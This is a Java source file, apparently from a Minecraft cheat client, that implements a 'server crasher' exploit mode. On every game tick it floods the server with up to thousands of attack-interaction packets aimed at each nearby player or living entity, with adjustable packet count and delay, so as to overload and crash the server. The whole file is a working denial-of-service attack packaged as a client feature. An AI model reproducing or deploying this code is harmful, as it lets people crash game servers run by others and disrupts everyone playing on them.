package de.nekosarekawaii.vandalism.feature.module.impl.exploit.modes.servercrasher;

import de.florianmichael.rclasses.math.integration.MSTimer;
import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.event.game.TickGameListener;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.ModuleMulti;
import net.minecraft.client.network.AbstractClientPlayerEntity;
import net.minecraft.entity.Entity;
import net.minecraft.entity.LivingEntity;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;

public class AttackModuleMode extends ModuleMulti<ServerCrasherModule> implements TickGameListener {

    private final IntegerValue maxPacketsPerTick = new IntegerValue(
            this.getParent(),
            "Max Packets Per Tick",
            "The maximum amount of packets sent per tick.",
            1000,
            500,
            10000
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final IntegerValue delay = new IntegerValue(
            this.getParent(),
            "Delay",
            "The delay between packets.",
            0,
            0,
            2000
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final BooleanValue anyEntity = new BooleanValue(
            this.getParent(),
            "Any Entity",
            "Whether to attack any entity or only players.",
            false
    ).visibleCondition(() -> this.getParent().mode.getValue().equals(this));

    private final MSTimer delayTimer = new MSTimer();

    public AttackModuleMode(final ServerCrasherModule parent) {
        super("Attack", parent);
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onDeactivate() {
        Vandalism.getInstance().getEventSystem().unsubscribe(TickGameEvent.ID, this);
    }

    @Override
    public void onTick() {
        if (this.mc.player == null) return;
        if (this.delayTimer.hasReached(this.delay.getValue(), true)) {
            for (final Entity entity : this.mc.world.getEntities()) {
                if (this.mc.player != entity) {
                    if (entity instanceof AbstractClientPlayerEntity || this.anyEntity.getValue() && entity instanceof LivingEntity) {
                        for (int i = 0; i < this.maxPacketsPerTick.getValue(); i++) {
                            this.mc.getNetworkHandler().getConnection().send(PlayerInteractEntityC2SPacket.attack(entity, this.mc.player.isSneaking()), null, true);
                        }
                    }
                }
            }
        }
    }

}
